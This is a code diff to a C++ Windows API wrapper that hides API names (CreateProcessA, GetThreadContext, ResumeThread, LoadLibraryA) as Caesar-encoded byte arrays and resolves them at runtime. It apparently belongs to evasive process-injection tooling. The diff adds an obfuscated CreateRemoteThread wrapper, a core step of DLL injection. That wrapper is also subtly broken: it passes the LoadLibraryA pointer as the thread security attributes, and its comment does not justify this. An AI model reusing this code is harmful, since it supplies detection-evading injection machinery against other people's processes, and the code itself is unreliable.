@@ -33,6 +33,7 @@ void WinAPIWrapper::_LoadFunctions() {
 	std::vector<unsigned char> GetThreadContext		= { 0x25, 0x43, 0x52, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42, 0x21, 0x4d, 0x4c, 0x52, 0x43, 0x56, 0x52 };
 	std::vector<unsigned char> CreateThread			= { 0x21, 0x50, 0x43, 0x3f, 0x52, 0x43, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42 };
 	std::vector<unsigned char> LoadLibraryA			= { 0x2a, 0x4d, 0x3f, 0x42, 0x2a, 0x47, 0x40, 0x50, 0x3f, 0x50, 0x57, 0x1f };
+	std::vector<unsigned char> CreateRemoteThread	= { 0x21, 0x50, 0x43, 0x3f, 0x52, 0x43, 0x30, 0x43, 0x4b, 0x4d, 0x52, 0x43, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42 };
 
 	// Descifrado de nombres de funciones
 	std::string CreateProcessA_str			= Obfuscator::decryptCaesar(CreateProcessA, 0xDE);
@@ -46,6 +47,7 @@ void WinAPIWrapper::_LoadFunctions() {
 	std::string GetThreadContext_str		= Obfuscator::decryptCaesar(GetThreadContext, 0xDE);
 	std::string CreateThread_str			= Obfuscator::decryptCaesar(CreateThread, 0xDE);
 	std::string LoadLibraryA_str			= Obfuscator::decryptCaesar(LoadLibraryA, 0xDE);
+	std::string CreateRemoteThread_str		= Obfuscator::decryptCaesar(CreateRemoteThread, 0xDE);
 
     if (hKernel32) {
 		// Obtener las direcciones de las funciones
@@ -58,6 +60,7 @@ void WinAPIWrapper::_LoadFunctions() {
         ResumeThread_		= reinterpret_cast<pResumeThread>(GetProcAddress(hKernel32, ResumeThread_str.c_str()));
         CreateThread_		= reinterpret_cast<pCreateThread>(GetProcAddress(hKernel32, CreateThread_str.c_str()));
 		LoadLibraryA_		= reinterpret_cast<pLoadLibraryA>(GetProcAddress(hKernel32, LoadLibraryA_str.c_str()));
+		CreateRemoteThread_	= reinterpret_cast<pCreateRemoteThread>(GetProcAddress(hKernel32, CreateRemoteThread_str.c_str()));
     }
 
     if (hNtdll) {
@@ -104,7 +107,18 @@ HANDLE WinAPIWrapper::CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZ
 	return CreateThread_ ? CreateThread_(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) : NULL;
 }
 
-HMODULE WinAPIWrapper::LoadLibraryA(LPCSTR lpLibFileName)
-{
+HMODULE WinAPIWrapper::LoadLibraryA(LPCSTR lpLibFileName) {
 	return LoadLibraryA_ ? LoadLibraryA_(lpLibFileName) : NULL;
+}
+
+HANDLE WinAPIWrapper::CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
+	/*  In that function wrapper, lpThreadAttributes argument is optional.
+	* LoadLibrary address is previously obtained by default in this class.
+	*/
+
+	if (lpThreadAttributes == NULL) {
+		lpThreadAttributes = (LPSECURITY_ATTRIBUTES)LoadLibraryA_;
+	}
+
+	return CreateRemoteThread_ ? CreateRemoteThread_(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) : NULL;
 }
